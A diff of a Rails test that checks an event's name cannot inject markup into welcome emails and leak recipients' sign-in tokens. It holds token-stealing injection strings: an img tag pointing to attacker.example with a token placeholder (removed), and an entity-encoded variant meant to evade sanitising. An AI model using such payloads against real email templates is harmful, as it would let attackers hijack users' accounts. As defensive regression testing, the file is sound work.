@@ -179,18 +179,19 @@ class GatheringsTest < ActiveSupport::TestCase
     assert_equal 'Gathering', @gathering.name
     @gathering.update!(name: 'Gathering %recipient.tok%recipient.token%en%')
     assert_equal 'Gathering', @gathering.name
-    @gathering.update!(name: 'Gathering &lt;img src="https://attacker.example/%recipient.token%"&gt;')
-    assert_equal 'Gathering <img src="https://attacker.example/">', @gathering.name
+    @gathering.update!(name: 'Gathering &lt;img src="https://name.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;')
     refute_includes @gathering.name, '%recipient'
     sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%">Sign in</a>)
     html = EmailHelper.html(content: @gathering.welcome_email) do |content|
       EmailHelper.replace_youtube_oembeds(content)
-                 .gsub('%gathering.name%', @gathering.name)
+                 .gsub('%gathering.name%', ERB::Util.html_escape(@gathering.name))
                  .gsub('%sign_in_details%', sign_in_details)
     end
 
     refute_match(%r{src="[^"]*%recipient\.token%}, html)
+    refute_match(/<img[^>]*name\.example/, html)
     assert_includes html, "#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%"
+    assert_equal html.scan('sign_in_token=%recipient.token%').size, html.scan('%recipient.token%').size
   end
 
   test 'comment cannot attach a post from another commentable' do
